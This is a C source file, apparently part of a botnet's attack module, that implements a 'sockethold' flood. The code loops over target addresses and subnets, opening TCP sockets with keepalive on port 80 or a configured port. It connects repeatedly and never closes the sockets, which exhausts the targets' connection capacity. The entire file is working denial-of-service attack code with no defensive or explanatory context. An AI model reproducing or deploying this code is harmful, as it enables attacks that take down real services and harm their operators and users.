#define _GNU_SOURCE

#include "../../attack.h"

void flood_sockethold(struct flood *flood)
{
    while (*flood->running)
    {
        int fd = -1;
        int keepAlive = 1;
        int i = 0;

        for (i = 0; i < flood->num_of_targets; i++)
        {
            if (!*flood->running) break;

            if ((fd = sys_socket(AF_INET, SOCK_STREAM, 0)) < 0)
                continue;

            sys_setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &keepAlive, sizeof(keepAlive));

            struct flood_target target = flood->targets[i];
            target.sock_addr.sin_family = AF_INET;
            target.sock_addr.sin_port = htons(flood->settings->dest_port == 0xffff ? 80 : flood->settings->dest_port);

            if (target.netmask < 32)
                target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

            sys_connect(fd, (struct sockaddr *)&target.sock_addr, sizeof(struct sockaddr_in));
            
            if (flood->settings->sleep > 0)
                sys_usleep(flood->settings->sleep * 1000);
        } 
    }
}
